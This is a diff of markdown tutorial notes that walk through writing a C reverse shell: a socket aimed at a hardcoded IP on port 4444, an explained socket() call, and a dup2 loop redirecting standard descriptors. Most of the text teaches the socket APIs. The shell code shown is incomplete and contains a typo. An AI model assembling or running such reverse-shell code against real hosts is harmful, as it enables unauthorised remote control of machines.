@@ -57,20 +57,30 @@ Newer linux machine by default has traditional **netcat** with `GAPING_SECURITY_
 
 int main () {
 	const char* ip = "192.168.0.108";
+	
+	// address struct
 	struct sockaddr_in addr;
 	addr.sin_family = AF_INET;
 	addr.sin_port = htons(4444);
 	inet_aton(ip, &addr.sin_addr);
+	
+	// socket syscall
+	int sockfd = socket(AF_INET, SOCK_STREAM, 0);
+	
+	// connect syscall
+	
 }
 ```
 
 ### Explanation
+---
 ```C
 #include <stdio.h>
 ```
 
 `<stdio.h>` : It is a **Header file** basic I/O like `printf()`, etc.
 
+---
 ```C
 #include <sys/socket.h>
 ```
@@ -90,6 +100,7 @@ int main () {
 
 `<sys/socket.h>` is what lets your C program **create and work with network sockets** on Unix-like systems.
 
+---
 ```C
 #include <netinet/ip.h>
 ```
@@ -103,6 +114,7 @@ In older or more complex socket programs (like raw sockets or packet crafting), 
 - `<netinet/ip.h>` gives you access to **IP packet structures**.
 - Mostly used for **raw sockets**, **packet analysis**, or **custom protocol implementation**.
 
+---
 ```C
 #include <arpa/inet.h>
 ```
@@ -125,13 +137,18 @@ In older or more complex socket programs (like raw sockets or packet crafting), 
 
 When you're dealing with sockets in C, the system doesn't understand IPs as strings like `"10.9.1.6"` — it wants them in **binary form** (`struct in_addr`), and `<arpa/inet.h>` gives you the tools to do that conversion.
 
-| Function      | What it does               |
-| ------------- | -------------------------- |
-| `inet_aton()` | "192.168.0.1" → binary     |
-| `inet_ntoa()` | binary → "192.168.0.1"     |
-| `inet_pton()` | text to binary (IPv4/IPv6) |
-| `inet_ntop()` | binary to text (IPv4/IPv6) |
+| Function                                  | What it does                                                                                                         |
+| ----------------------------------------- | -------------------------------------------------------------------------------------------------------------------- |
+| `inet_aton()`                             | "192.168.0.1" → binary                                                                                               |
+| `inet_ntoa()`                             | binary → "192.168.0.1"                                                                                               |
+| `inet_pton()`                             | text to binary (IPv4/IPv6)                                                                                           |
+| `inet_ntop()`                             | binary to text (IPv4/IPv6)                                                                                           |
+| `uint32_t htonl(uint32_t hostlong)`       | The **htonl**() function converts the unsigned integer _hostlong_ from host byte order to network byte order.        |
+| `uint16_t htons(uint16_t hostshort);`<br> | The **htons**() function converts the unsigned short integer _hostshort_ from host byte order to network byte order. |
+| `uint32_t ntohl(uint32_t netlong);`<br>   | The **ntohl**() function converts the unsigned integer _netlong_ from network byte order to host byte order.         |
+| `uint16_t ntohs(uint16_t netshort);`      | The **ntohs**() function converts the unsigned short integer _netshort_ from network byte order to host byte order.  |
 
+---
 ```C
 #include <unistd.h>
 ```
@@ -170,6 +187,7 @@ This gives the attacker a shell.
 
 It's essential for making C programs that interact closely with the OS.
 
+---
 ```C
 int main()
 ```
@@ -204,7 +222,7 @@ int main() {
     - `argc` (argument count): Number of command-line arguments.
     - `argv` (argument vector): Array of strings containing the arguments.
 
-
+---
 ```C
 const char* ip = "192.168.0.108";
 ```
@@ -223,7 +241,7 @@ const char* ip = "192.168.0.108";
 **`ip`**
 - This is the **variable name**, and it holds the pointer to the first character of the string.
 
-
+---
 ```c
 struct sockaddr_in addr;
 ```
@@ -277,3 +295,190 @@ You _store the real info_ in `sockaddr_in`, but _pass it around_ as a `sockaddr*
 | `sockaddr_in` | IPv4    | ✅ Yes               | ✅ (via cast)         |
 | `sockaddr`    | Generic | ❌ No (raw only)     | ✅ Required type      |
 
+---
+```C
+addr.sin_family = AF_INET
+```
+
+`sin_family` is a field inside the `struct sockaddr_in` structure.  
+It tells the system **what kind of addresses you're working with**.
+
+| Constant   | Meaning                 |
+| ---------- | ----------------------- |
+| `AF_INET`  | IPv4 addresses          |
+| `AF_INET6` | IPv6 addresses          |
+| `AF_UNIX`  | UNIX domain (local IPC) |
+
+This is critical because without it, the system won’t know how to interpret the rest of the data (like `sin_port` and `sin_addr`).
+
+- `addr.sin_family = AF_INET;`  
+    ➤ You're saying, _"this socket uses IPv4 addresses."_
+
+---
+```C
+addr.sin_port = htons(4444);
+```
+
+`sin_port` is a field in the `struct sockaddr_in` that stores the **port number** your program will connect to or listen on.
+
+Ports must be stored in **network byte order**, not the way your computer stores numbers (host byte order).  
+
+That’s where `htons()` comes in.
+
+`htons()` is a function from `<arpa/inet.h>`
+`htons()` stands for:
+
+> **Host TO Network Short**
+
+- **Host** = your machine's internal number format (could be [little-endian](https://www.geeksforgeeks.org/little-and-big-endian-mystery/)).
+- **Network** = the standard [big-endian](https://www.geeksforgeeks.org/little-and-big-endian-mystery/) format used in networking.
+- **Short** = 16-bit number (because a port is 2 bytes).
+
+```c
+htons(4444)
+```
+
+➡ Converts `4444` to a 16-bit **network byte order** number.
+
+**🧠 Why is byte order important?**
+
+Different computers may store bytes differently (big-endian vs little-endian).  
+But on the internet, everyone agrees to use **network byte order** (big-endian).
+
+> [!Hint] Title
+> If you don’t convert the port using `htons()`, it could look like a totally different number on the network.
+
+> “Store port `4444` in network byte order in the `addr` structure.”
+
+| Part            | Meaning                                                  |
+| --------------- | -------------------------------------------------------- |
+| `addr.sin_port` | The port number field in `sockaddr_in`                   |
+| `htons(4444)`   | Converts port 4444 to **network byte order**             |
+| Why?            | So all devices on the network understand it the same way |
+
+---
+```C
+inet_aton(ip, &addr.sin_addr);
+```
+
+> **What is `inet_aton()`?**
+
+It stands for: 
+	**Internet** – **ASCII TO Network**
+
+In short:
+- Converts an IP address **in text (string)** form (like `"10.9.1.6"`)
+
+| Function                  | Purpose                                      |
+| ------------------------- | -------------------------------------------- |
+| `inet_aton()`             | Converts IP from string → binary (`in_addr`) |
+| Input ➡ `ip`              | `"10.9.1.6"` (text)                          |
+| Output ➡ `&addr.sin_addr` | Stored in `addr.sin_addr` in binary          |
+1. **`char* ip = "10.9.1.6";`**
+This line declares a **pointer to a string**:
+```c
+char* ip = "10.9.1.6";
+```
+- `char* ip` means you're declaring a pointer that will point to a character (`char`), or more specifically, a sequence of characters (a string). 
+- `"10.9.1.6"` is a **string literal**. This is essentially an array of characters in memory:
+    ```
+    10.9.1.6\0
+    ```
+    The `\0` at the end is the **null terminator** that marks the end of the string in C.
+- `ip` will point to the **first character** of this string. So, `ip` stores the **memory address** where `"10.9.1.6"` starts.
+
+2. **What Does `inet_aton(ip, &addr.sin_addr)` Do?**
+- `inet_aton()` converts a **dotted-decimal string IP address** (like `"10.9.1.6"`) to its **binary representation** (network byte order).
+- The first parameter (`ip`) is the **string** you want to convert — it’s just the **memory address** of the first character of `"10.9.1.6"`.
+- The second parameter (`&addr.sin_addr`) is the **memory location** where the result will be stored. `&addr.sin_addr` gives us the **address** of `sin_addr` in the `sockaddr_in` structure, which is of type `struct in_addr`.
+
+3. **What Does `inet_aton` Do Internally?**
+Here’s what happens when `inet_aton()` runs:
+- It reads the string `"10.9.1.6"`.
+- It converts it to **binary** in **network byte order**.
+
+For example:
+- `"10.9.1.6"` becomes `0x0A090106` (in hexadecimal).
+    - `10` → `0x0A`
+    - `9` → `0x09`
+    - `1` → `0x01`
+    - `6` → `0x06`
+- This value is **stored** in the `sin_addr.s_addr` field of `addr`. Since `inet_aton()` uses network byte order, it would be stored as:
+    ```
+    0x0A090106
+    ```
+
+4. **What Does `addr.sin_addr` Contain?**
+After calling `inet_aton(ip, &addr.sin_addr)`:
+- `addr.sin_addr` will contain the **binary representation** of the IP address.
+In this case:
+```c
+addr.sin_addr.s_addr = 0x0A090106;  // Network byte order: 10.9.1.6
+```
+
+The **conversion** happens internally, and the result is stored in the second argument (`struct in_addr *inp`).
+
+For example:
+
+```c
+inet_aton("10.9.1.6", &addr.sin_addr);
+```
+
+- **`"10.9.1.6"`** is the **string IP address**.
+- **`&addr.sin_addr`** is the **pointer to the memory location** where the **binary network form** of the IP will be stored.
+ So:
+- `inet_aton()` **does not return the binary address directly**.
+- Instead, it **stores the binary address in the location** pointed to by `inp` (in this case, `&addr.sin_addr`).
+- The function itself just returns `1` (success) or `0` (failure).
+
+---
+```C
+int sockfd = socket(AF_INET, SOCK_STREAM, 0);
+```
+
+The `socket()` function is used to create a **new socket** for communication between processes over a network. It's the first step in setting up communication.
+1. **`AF_INET`** (Address Family)
+	- **`AF_INET`** stands for **Address Family - Internet**.
+	- It means you're using **IPv4 addresses** (like `192.168.0.1` or `10.9.1.6`).
+If you wanted to use IPv6 addresses instead, you would use:
+```c
+AF_INET6
+```
+
+2. **`SOCK_STREAM`** (Socket Type)
+	- **`SOCK_STREAM`** means you're creating a **stream socket**.
+	- **Stream sockets** provide **reliable, connection-oriented communication** (like TCP).
+	- **TCP (Transmission Control Protocol)** is used for most network communications because it ensures that data is delivered correctly and in order.
+If you wanted to use a **datagram socket** (which is connectionless, like UDP), you would use:
+```c
+SOCK_DGRAM
+```
+3. **`0`** (Protocol)
+	- The third argument (`0`) specifies the protocol to be used.
+	- When it's set to `0`, it tells the system to automatically pick the correct protocol based on the **address family** and **socket type**.
+For **IPv4 + SOCK_STREAM**, the system will choose **TCP** as the default protocol (since it's the most common for stream sockets).
+You could manually specify a protocol like this:
+```c
+IPPROTO_TCP   // For TCP
+IPPROTO_UDP   // For UDP
+```
+
+🔸 **What Happens Inside the `socket()` Call?**
+1. The **operating system** creates a new socket object in the kernel.
+2. It associates this socket with the **networking protocols** based on the arguments you provided (`AF_INET`, `SOCK_STREAM`, and `0`). 
+3. It returns a **[file descriptor](https://en.wikipedia.org/wiki/File_descriptor)** (which is an integer, here it's `sockfd`) that you can use to refer to this socket for later operations, like connecting, reading, writing, etc.
+
+`sockfd`:
+- **`sockfd`** will hold the **socket file descriptor** — a unique identifier for this socket.
+- You’ll use this descriptor to perform actions on the socket (e.g., connect, send, receive).
+> **In Summary:**
+1. Creates a **TCP socket** (since `SOCK_STREAM` and `AF_INET` are used).
+2. The socket will be used for **IPv4** addresses (`AF_INET`).
+3. `0` lets the system pick the default protocol (TCP for stream sockets).
+4. The **file descriptor** for the new socket is stored in `sockfd`, which will be used in future socket-related operations like `connect()`, `bind()`, `send()`, etc.
+---
+```c
+for (int i =0; i < 3; i++){
+	dup2(sockdf, i);
+}
+```
